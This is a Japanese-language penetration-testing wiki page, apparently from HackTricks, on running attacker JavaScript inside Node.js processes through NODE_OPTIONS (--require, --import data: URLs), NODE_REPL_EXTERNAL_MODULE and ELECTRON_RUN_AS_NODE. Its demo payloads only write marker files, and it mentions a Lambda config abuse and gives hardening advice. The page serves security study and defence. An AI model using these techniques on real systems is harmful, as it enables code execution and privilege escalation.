# macOS Node.js Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## 概要

攻撃者が、最終的に **Node.js**（`node` バイナリを直接実行する場合、または `npm`、`npx`、`yarn`、`pnpm`、`eslint`、`tsc`、`next` などの Node ベースの CLI）を起動するプロセスの環境を制御できる場合、複数の環境変数によって、対象プログラムの実行前に **攻撃者が制御する JavaScript を runtime にロードして実行**させることができます。これは、他の runtime における `PERL5OPT`／`RUBYOPT`／`_JAVA_OPTIONS` 系と同等のコード実行プリミティブです。

preloaded code は、被害者と同じ uid、環境、file descriptors、entitlements を持つ **同一プロセス内**で実行されます。そのため、より高い権限を持つプロセスが、継承された環境または攻撃者の影響を受けた環境で Node を起動する場合、これはクリーンな injection/priv-esc vector となります。

## `NODE_OPTIONS` — `--require` (file-backed)

`NODE_OPTIONS` は、その内容が追加のコマンドラインフラグであるかのように解析されます。`--require`（`-r`）は、エントリーポイントの **前に** CommonJS module を preload するため、その top-level code が最初に実行されます。<sup>[[1]](#references)</sup>
```bash
# Target script
echo "console.log('target script ran')" > /tmp/victim.js

# Attacker-controlled preload module
echo "require('fs').writeFileSync('/tmp/node-require-executed','x'); console.log('[require preload]')" > /tmp/preload.js

NODE_OPTIONS="--require /tmp/preload.js" node /tmp/victim.js
# [require preload]
# target script ran
```
## `NODE_OPTIONS` — `--import` with a `data:` URL (ファイルレス)

**Node 20.6** 以降、`--import` は `data:text/javascript,<code>` URL を受け入れるため、ディスク上にファイルやモジュールディレクトリを用意せずに、ES-module JavaScript をインラインで preload できます。コードは**完全に URL-encoded** でなければなりません（raw のスペースや `#` は data URL を途中で切断し、`SyntaxError` を発生させます）。<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# Build a fully URL-encoded data: URL payload
node -e 'const js="import(\"fs\").then(f=>f.writeFileSync(\"/tmp/node-import-executed\",\"x\"));console.log(\"[import preload]\")"; console.log("data:text/javascript,"+encodeURIComponent(js))' > /tmp/dataurl.txt

NODE_OPTIONS="--import $(cat /tmp/dataurl.txt)" node /tmp/victim.js
# [import preload]
# target script ran
```
これは cloud で悪用される technique です。たとえば、AWS Lambda function の configuration に `NODE_OPTIONS` を注入し（`iam:PassRole` は不要）、execution role として code を実行します。

> [!TIP]
> `NODE_OPTIONS` は code を直接実行できません。`--eval`/`-e`、`-p`、script path などの flag は明示的に拒否されます（`node: --eval is not allowed in NODE_OPTIONS`）。代わりに、`--require`/`--import` を使って code を指定します。

## `NODE_OPTIONS` — custom loaders / その他の startup flags

`NODE_OPTIONS` は、attacker code の実行を side effect とする、その他の startup に影響する flag も受け付けます。たとえば ESM loader hook などです。
```bash
# Node >= 20.6 (loader hooks run in a separate thread)
NODE_OPTIONS="--import ./hooks.mjs" node app.mjs
# Older Node
NODE_OPTIONS="--experimental-loader ./hooks.mjs" node app.mjs
```
Nodeベースのランチャーで子プロセスの `node` を起動するものは、通常 `NODE_OPTIONS` を**引き継ぐ**ため、一度注入するとツールチェーン全体（`npm run …`、`npx`、build tools、test runners、language servers）に影響を及ぼせます。

## `NODE_REPL_EXTERNAL_MODULE`

Nodeが**interactive REPL**を起動すると、`NODE_REPL_EXTERNAL_MODULE`で指定されたモジュールを読み込み、そのトップレベルコードを実行します。これは、被害者がinteractiveな`node`/`node -i` shell（dev tooling、maintenance consoles）を起動する場合に便利です。<sup>[[3]](#references)</sup>
```bash
echo "require('fs').writeFileSync('/tmp/node-repl-executed','x'); module.exports={};" > /tmp/replmod.js
printf '.exit\n' | NODE_REPL_EXTERNAL_MODULE=/tmp/replmod.js node -i
ls -la /tmp/node-repl-executed
```
> [!WARNING]
> `NODE_REPL_EXTERNAL_MODULE` は、`kDisableNodeOptionsEnv` protection を使用して child を spawn した場合は意図的に **無視されます** が、直接起動された interactive REPL では有効になります。

## Electron (`ELECTRON_RUN_AS_NODE`)

Electron applications は **`ELECTRON_RUN_AS_NODE=1`** で起動すると full Node runtime を再公開します。この時点で、上記のすべての `NODE_OPTIONS` vectors が（多くの場合 signed/entitled な）Electron binary に適用されます。次を参照してください。

{{#ref}}
macos-electron-applications-injection.md
{{#endref}}

## その他の JS runtimes

- **Bun** は compatibility のために `NODE_OPTIONS` を読み取り、独自の `--preload`（`bunfig.toml` で設定可能）をサポートします。
- **Deno** は `NODE_OPTIONS` を有効にせず、代わりに明示的な flags（`--import`、`--preload`）を必要とするため、継承された `NODE_OPTIONS` に対して脆弱ではありません。

accepted flags は releases ごとに変わるため、必ず正確な runtime と version を確認してください。

## Hardening

- より privileged な context から Node を起動する前に、environment から `NODE_OPTIONS`、`NODE_REPL_EXTERNAL_MODULE`、`ELECTRON_RUN_AS_NODE` を削除し、sanitized environment で children を spawn します。
- target の environment を設定できること（config injection、`launchd`/`launchctl setenv`、plist/`EnvironmentVariables`、CI variables、Lambda/container config）は、それが起動するあらゆる Node process における code execution と同等に扱います。
- [Shield](https://github.com/theevilbit/Shield) が `ELECTRON_RUN_AS_NODE` および dyld injection variables に対して alert を出すのと同様に、これらの variables について process exec を monitor します。

## References

- [1] [Node.js CLI documentation — `NODE_OPTIONS`、`--require`、`--import`](https://nodejs.org/api/cli.html#node_optionsoptions)
- [2] [Node.js ESM — `--import` と `data:` URLs](https://nodejs.org/api/esm.html#data-imports)
- [3] [Node.js REPL — `NODE_REPL_EXTERNAL_MODULE`](https://nodejs.org/api/repl.html#environment-variable-options)
{{#include ../../../banners/hacktricks-training.md}}
